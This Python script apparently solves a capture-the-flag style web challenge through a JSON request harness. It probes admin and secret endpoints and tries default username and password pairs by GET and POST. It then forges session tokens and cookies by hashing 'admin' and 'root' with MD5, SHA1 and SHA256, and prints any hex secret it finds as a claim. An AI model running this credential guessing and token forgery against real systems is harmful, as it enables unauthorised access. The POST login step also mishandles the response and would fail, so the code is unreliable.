import json, sys, base64, hashlib

def req(method, path, headers=None, body=None, body_hex=None):
    r = {"http": {"method": method, "path": path}}
    if headers: r["http"]["headers"] = headers
    if body is not None: r["http"]["body"] = body
    if body_hex is not None: r["http"]["body_hex"] = body_hex
    print(json.dumps(r), flush=True)
    line = sys.stdin.readline()
    return json.loads(line)

def get(path, headers=None):
    resp = req("GET", path, headers=headers)
    try:
        return resp.get("status"), base64.b64decode(resp.get("body_b64","")).decode(errors="replace")
    except Exception:
        return resp.get("status"), ""

# Probe endpoints
for p in ["/", "/login", "/admin", "/session", "/flag", "/secret", "/status", "/health", "/token", "/auth", "/robots.txt", "/index.html", "/api", "/api/status", "/api/secret", "/api/admin"]:
    s, b = get(p)
    print(p, s, b[:300].replace("\n"," "), flush=True)

# Try login with common creds
for u, pw in [("admin","admin"),("admin","password"),("admin","admin123"),("admin",""),("administrator","admin"),("root","root"),("admin","secret")]:
    s, b = get("/login?username=%s&password=%s" % (u, pw))
    print("LOGIN", u, pw, s, b[:300].replace("\n"," "), flush=True)
    s, b = req("POST", "/login", body="username=%s&password=%s" % (u, pw))
    try:
        bb = base64.b64decode(s.get("body_b64","")).decode(errors="replace")
    except Exception:
        bb = ""
    print("POSTLOGIN", u, pw, s.get("status"), bb[:300].replace("\n"," "), flush=True)

# Try common token schemes: hash of username
for name in ["admin", "administrator", "root"]:
    for h in [hashlib.md5, hashlib.sha1, hashlib.sha256]:
        tok = h(name.encode()).hexdigest()
        for ck in ["session", "token", "auth", "sid", "sessionid"]:
            s, b = get("/admin", headers={ck: tok})
            if s == 200 and ("secret" in b.lower() or "flag" in b.lower() or "admin" in b.lower()):
                print("FOUND", name, h.__name__, ck, s, b[:500], flush=True)
                # extract secret
                import re
                m = re.search(r'[0-9a-fA-F]{16,}', b)
                if m:
                    print('CLAIM:' + json.dumps({"secret_hex": m.group(0)}), flush=True)
                    sys.exit(0)

# Try cookie-based: login then use cookie
resp = req("POST", "/login", body="username=admin&password=admin")
print("RAWLOGIN", json.dumps(resp)[:500], flush=True)

# Try /admin with various derived tokens
for name in ["admin", "administrator"]:
    for h in [hashlib.md5, hashlib.sha1, hashlib.sha256]:
        tok = h(name.encode()).hexdigest()
        s, b = get("/admin", headers={"Cookie": "session=%s" % tok})
        print("COOKIE", name, h.__name__, s, b[:300].replace("\n"," "), flush=True)
        if s == 200 and len(b) > 10:
            import re
            m = re.search(r'[0-9a-fA-F]{16,}', b)
            if m:
                print('CLAIM:' + json.dumps({"secret_hex": m.group(0)}), flush=True)
                sys.exit(0)

print("DONE", flush=True)